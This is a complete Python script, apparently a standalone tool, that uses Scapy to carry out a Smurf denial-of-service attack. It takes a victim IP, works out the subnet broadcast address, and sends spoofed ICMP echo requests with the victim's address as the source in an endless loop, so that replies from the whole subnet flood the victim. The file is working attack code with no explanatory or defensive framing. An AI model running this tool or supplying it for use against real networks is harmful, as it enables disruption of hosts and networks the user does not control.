#!/usr/bin/env python

import sys
import os
import ipaddress
import time
from scapy.all import *
import random

def check_root():
    if os.geteuid() != 0:
        print("Script must run as root")
        sys.exit(1)

def get_broadcast_ip(ip):
    net = ipaddress.ip_network(f"{ip}/24", strict=False)
    return str(net.broadcast_address)

def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

def smurf_attack(broadcast_ip, victim_ip):
    random_mac = generate_random_mac()
    
    packet = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") / IP(src=victim_ip, dst=broadcast_ip) / ICMP(type="echo-request")
    
    sendp(packet, verbose=0)

def main():
    check_root()
    
    victim_ip = sys.argv[1] if len(sys.argv) > 1 else input("Enter victim IP: ")
    broadcast_ip = get_broadcast_ip(victim_ip)

    print("Start Smurf attack")
    print("Broadcast IP :", broadcast_ip)
    print("Victim IP    :", victim_ip)

    try:
        print("To stop press CTRL+C")
        while True:
            smurf_attack(broadcast_ip, victim_ip)
            time.sleep(0.01)
    except KeyboardInterrupt:
        print("\nSmurf attack stopped")

if __name__ == "__main__":
    main()